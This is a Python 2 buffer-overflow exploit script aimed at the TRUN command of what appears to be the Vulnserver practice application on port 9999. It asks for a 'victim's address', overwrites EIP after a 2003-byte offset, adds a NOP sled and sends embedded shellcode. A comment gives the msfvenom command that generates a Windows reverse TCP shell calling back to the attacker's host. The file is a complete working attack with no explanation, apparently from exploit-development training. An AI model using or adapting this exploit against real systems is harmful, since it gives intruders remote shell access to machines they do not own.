#!/usr/bin/python2

import socket
import sys

print('')
host = raw_input("Enter the victim's address: ")
port = 9999
prefix = "TRUN /.:/"
offset = 2003
EIP = "A" * offset
return_address = "\xaf\x11\x50\x62"
nops_sled = "\x90" * 16

# BADCHARS = "\X00"
# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT EXITFUNC=thread -b "\x00" -f c

shellcode = (
	"\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb8\x51\xdb\x6b\xb0\xb1"
	"\x52\x31\x45\x17\x03\x45\x17\x83\x94\xdf\x89\x45\xea\x08\xcf"
	"\xa6\x12\xc9\xb0\x2f\xf7\xf8\xf0\x54\x7c\xaa\xc0\x1f\xd0\x47"
	"\xaa\x72\xc0\xdc\xde\x5a\xe7\x55\x54\xbd\xc6\x66\xc5\xfd\x49"
	"\xe5\x14\xd2\xa9\xd4\xd6\x27\xa8\x11\x0a\xc5\xf8\xca\x40\x78"
	"\xec\x7f\x1c\x41\x87\xcc\xb0\xc1\x74\x84\xb3\xe0\x2b\x9e\xed"
	"\x22\xca\x73\x86\x6a\xd4\x90\xa3\x25\x6f\x62\x5f\xb4\xb9\xba"
	"\xa0\x1b\x84\x72\x53\x65\xc1\xb5\x8c\x10\x3b\xc6\x31\x23\xf8"
	"\xb4\xed\xa6\x1a\x1e\x65\x10\xc6\x9e\xaa\xc7\x8d\xad\x07\x83"
	"\xc9\xb1\x96\x40\x62\xcd\x13\x67\xa4\x47\x67\x4c\x60\x03\x33"
	"\xed\x31\xe9\x92\x12\x21\x52\x4a\xb7\x2a\x7f\x9f\xca\x71\xe8"
	"\x6c\xe7\x89\xe8\xfa\x70\xfa\xda\xa5\x2a\x94\x56\x2d\xf5\x63"
	"\x98\x04\x41\xfb\x67\xa7\xb2\xd2\xa3\xf3\xe2\x4c\x05\x7c\x69"
	"\x8c\xaa\xa9\x3e\xdc\x04\x02\xff\x8c\xe4\xf2\x97\xc6\xea\x2d"
	"\x87\xe9\x20\x46\x22\x10\xa3\x63\xa2\x09\xc2\x1c\xc6\x2d\x35"
	"\x81\x4f\xcb\x5f\x29\x06\x44\xc8\xd0\x03\x1e\x69\x1c\x9e\x5b"
	"\xa9\x96\x2d\x9c\x64\x5f\x5b\x8e\x11\xaf\x16\xec\xb4\xb0\x8c"
	"\x98\x5b\x22\x4b\x58\x15\x5f\xc4\x0f\x72\x91\x1d\xc5\x6e\x88"
	"\xb7\xfb\x72\x4c\xff\xbf\xa8\xad\xfe\x3e\x3c\x89\x24\x50\xf8"
	"\x12\x61\x04\x54\x45\x3f\xf2\x12\x3f\xf1\xac\xcc\xec\x5b\x38"
	"\x88\xde\x5b\x3e\x95\x0a\x2a\xde\x24\xe3\x6b\xe1\x89\x63\x7c"
	"\x9a\xf7\x13\x83\x71\xbc\x34\x66\x53\xc9\xdc\x3f\x36\x70\x81"
	"\xbf\xed\xb7\xbc\x43\x07\x48\x3b\x5b\x62\x4d\x07\xdb\x9f\x3f"
	"\x18\x8e\x9f\xec\x19\x9b"
)
buffer = prefix + EIP + return_address + nops_sled + shellcode

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print("[+] Sending Payloads")
	s.send(bytes(buffer))
	print("[+] Done")
except:
	print("Host is unreachable")
	sys.exit()
